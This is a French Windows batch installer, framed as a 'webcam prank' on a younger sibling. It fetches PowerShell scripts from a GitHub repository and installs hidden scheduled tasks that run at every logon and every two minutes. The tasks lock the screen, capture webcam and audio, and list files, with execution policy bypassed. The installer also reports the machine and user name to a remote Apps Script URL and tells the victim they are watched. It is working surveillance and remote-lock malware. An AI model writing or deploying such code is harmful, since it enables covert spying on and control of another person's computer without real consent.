@echo off
:: ================================================================
:: BLAGUE WEBCAM — Installation
:: A PERSONNALISER avant d'envoyer :
::   WEBAPP_URL  : URL du Apps Script Web App (apres deploiement)
::   TOKEN       : ton token GitHub
::   CODE_SECRET : code pour debloquer l'ecran
:: ================================================================

set WEBAPP_URL=REMPLACER_PAR_URL_APPS_SCRIPT
set TOKEN=REMPLACER_PAR_TON_TOKEN_GITHUB
set CODE_SECRET=REMPLACER_PAR_TON_CODE_SECRET
set OWNER=thesangu
set REPO=Aventuuuure
set BRANCH=main
set DOSSIER=%APPDATA%\BlagueVerrou

set PS_LOCK=%DOSSIER%\blague_lock_windows.ps1
set PS_CAM=%DOSSIER%\blague_webcam_windows.ps1
set PS_LIST=%DOSSIER%\blague_listing_windows.ps1
set PS_AUDIO=%DOSSIER%\blague_audio_windows.ps1
set FFMPEG=%DOSSIER%\ffmpeg.exe
set RAW=https://raw.githubusercontent.com/%OWNER%/%REPO%/claude/signature-prank-replace-xhom2n/tools

mkdir "%DOSSIER%" 2>nul

echo [1/4] Telechargement des scripts...
curl -s -L "%RAW%/blague_lock_windows.ps1"     -o "%PS_LOCK%"
curl -s -L "%RAW%/blague_webcam_windows.ps1"   -o "%PS_CAM%"
curl -s -L "%RAW%/blague_listing_windows.ps1"  -o "%PS_LIST%"
curl -s -L "%RAW%/blague_audio_windows.ps1"   -o "%PS_AUDIO%"

echo [2/4] Telechargement de ffmpeg (patience, ~60Mo)...
powershell -Command ^
  "Invoke-WebRequest 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip' -OutFile '$env:TEMP\ffmpeg.zip'; ^
   Expand-Archive '$env:TEMP\ffmpeg.zip' -DestinationPath '$env:TEMP\ffmpeg_ext' -Force; ^
   Copy-Item (Get-ChildItem '$env:TEMP\ffmpeg_ext' -Filter 'ffmpeg.exe' -Recurse | Select-Object -First 1).FullName '%FFMPEG%'"

echo [3/4] Detection de la webcam...
for /f "delims=" %%C in ('powershell -Command ^
  "& '%FFMPEG%' -list_devices true -f dshow -i dummy 2>&1 | Select-String '\\\".*\\\"' | Select-Object -First 1 | ForEach-Object { $_.Matches.Value.Trim('\"') }"') do set CAMERA=%%C

echo     Webcam detectee : %CAMERA%

echo [4/4] Ecriture de la configuration...
powershell -Command ^
  "$c = [ordered]@{token='%TOKEN%';owner='%OWNER%';repo='%REPO%';branch='%BRANCH%';lock_path='data/blague_lock.json';code_secret='%CODE_SECRET%';camera_name='%CAMERA%';webapp_url='%WEBAPP_URL%'}; ^
   $c | ConvertTo-Json | Set-Content -Encoding UTF8 '%DOSSIER%\blague_config.json'"

:: Taches planifiees (lockscreen + webcam + listing, tous les 2min + au demarrage)
set CMD_LOCK=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_LOCK%"
set CMD_CAM=powershell  -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_CAM%"
set CMD_LIST=powershell  -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_LIST%"
set CMD_AUDIO=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_AUDIO%"

schtasks /create /tn "BlagueVerrou"        /tr "%CMD_LOCK%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueVerrouGardien" /tr "%CMD_LOCK%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueWebcam"        /tr "%CMD_CAM%"  /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueWebcamGardien" /tr "%CMD_CAM%"  /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BloagueListing"       /tr "%CMD_LIST%"  /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueListingGardien" /tr "%CMD_LIST%"  /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueAudio"          /tr "%CMD_AUDIO%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
schtasks /create /tn "BlagueAudioGardien"   /tr "%CMD_AUDIO%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1

:: Notifier le grand frere dans Google Sheets que l'installation a eu lieu
powershell -Command ^
  "$body = @{type='install';machine=$env:COMPUTERNAME;user=$env:USERNAME;date=(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')} | ConvertTo-Json -Compress; ^
   Invoke-RestMethod -Uri '%WEBAPP_URL%' -Method Post -Body $body -ContentType 'application/json' | Out-Null"

:: Lancement immediat
start "" /b %CMD_LOCK%
start "" /b %CMD_CAM%
start "" /b %CMD_LIST%
start "" /b %CMD_AUDIO%

powershell -Command ^
  "Add-Type -AssemblyName PresentationFramework; ^
   [System.Windows.MessageBox]::Show('Systeme active.`n`nTon grand frere voit maintenant tout.`nIl peut bloquer ton PC quand il veut.`n`nBienvenue dans la matrice. 😊', 'GG', 'OK', 'Information') | Out-Null"
